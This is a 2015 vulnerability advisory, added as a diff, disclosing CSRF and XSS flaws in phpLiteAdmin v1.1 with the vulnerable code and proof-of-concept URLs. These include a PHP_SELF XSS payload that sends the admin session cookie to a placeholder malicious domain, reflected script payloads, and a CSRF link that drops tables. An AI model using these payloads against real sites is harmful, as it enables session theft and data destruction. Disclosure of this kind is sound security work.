@@ -1,0 +1,172 @@
+# Exploit Title:  CSRF & XSS
+# Google Dork: intitle: CSRF & XSS
+# Date: 2015-07-05
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: bitbucket.org/phpliteadmin
+# Software Link: bitbucket.org/phpliteadmin
+# Version: v1.1
+# Tested on: windows 7
+# Category: webapps
+
+Vendor:
+================================
+bitbucket.org/phpliteadmin
+
+Product:
+================================
+phpLiteAdmin v1.1
+
+Advisory Information:
+================================================
+CSRF & XSS Vulnerabilities
+
+Vulnerability Details:
+======================
+
+CSRF:
+------
+No CSRF token exists when making calls to various SQL operations
+therefore we can get user to drop the whole database tables if they click
+on our malicious link and table is known.
+
+XSS:
+------
+There are three XSS vulnerabilities I point out first is use of 'PHP_SELF',
+second is unsanitized parameter
+for SQL statement when calling drop table method e.g. '
+http://localhost/phpliteadmin.php?droptable=[XSS]'
+and third is an unsanitized 'table' parameter e.g. '
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php?table=[XSS]'
+
+Lets look at the first one more in depth as its more fun.
+phpliteadmin uses a PHP reserved server variable $_SERVER['PHP_SELF'] which
+is vulnerable if not used correctly
+allowing us to inject an XSS payload to steal session cookies and navigate
+them to a place of our choosing
+in order to cause mayhem.
+
+On line 32 of 'phpliteadmin.php' we find vulnerable code:
+
+--------------------------------------------------------
+//build the basename of this file
+$nameArr = explode("?", $_SERVER['PHP_SELF']);
+$thisName = $nameArr[0];
+$nameArr = explode("/", $thisName);
+$thisName = $nameArr[sizeof($nameArr)-1];
+
+//constants
+define("VERSION", "1.1");
+define("PAGE", $thisName);
+-------------------------------------------------------
+
+In PHP docs we find the following explanation of 'PHP_SELF':
+"The filename of the currently executing script, relative to the document
+root."
+ref: http://php.net/manual/en/reserved.variables.server.php
+
+It is known $_SERVER['PHP_SELF'] can make your application insecure as we
+can inject code following a forward slash "/"
+But we have slight problem to overcome, we can execute code but our forward
+slashes will not be processed correctly
+and exploit will FAIL! leaving us with the following useless URL instead of
+taking the victim to a domain of our choice.
+
+
+Fail exploit example:
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php/
+"'onMouseOver="window.open('http://hyp3rlinx.altervista.org')"
+
+Failed Result:
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php/hyp3rlinx.altervista.org
+
+
+But all is NOT lost!, we will construct our malicious URL forward slashes
+in our JS call to window.open() method using
+String.charCodeAt(58) for ':' and String.charCodeAt(47) for '/' which will
+NOW give us what we seek, control over the users browser
+taking them to some terrible dark place.
+
+Bypass $_SERVER['PHP_SELF'] forward slash '//' processing issue:
+
+Tada!, our successful XSS exploit:
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php/"'onMouseOver="(function(){var
+x='http';x+=String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+'
+hyp3rlinx.altervista.org';window.open(x);})()"
+
+
+Exploit code(s):
+===============
+
+XSS(s) POC:
+----------
+
+
+1- $_SERVER['PHP_SELF'] XSS exploit steals current admin session cookie and
+sends to remote server:
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php/"'onMouseOver="(function(){var
+x='http';x+=String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+'MALICIOUS-DOMAIN';window.open(x+String.fromCharCode(47)+'cookietheft.php'+String.fromCharCode(63)+'='+document.cookie);})()"
+
+
+2- SQL droptable XSS:
+http://localhost/sectest/phpliteadmin_v1-1/phpliteadmin.php?droptable=
+<script>alert(666)</script>
+
+
+3- SQL table XSS:
+http://localhost/phpliteadmin_v1-1/phpliteadmin.php?table=
+"/><script>alert(666)</script>
+
+
+
+CSRF POC:
+---------
+Drop tables:
+localhost/phpliteadmin_v1-1/phpliteadmin.php?droptable=mytable&confirm=1
+
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification:  NA
+July 5, 2015  : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+Med
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] GET
+
+
+Vulnerable Product:             [+] phpliteadmin_v1-1
+
+
+Vulnerable Parameter(s):        [+] $_SERVER['PHP_SELF'], droptable, table
+
+
+Affected Area(s):               [+] Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author. The author is not responsible for any misuse of the information
+contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
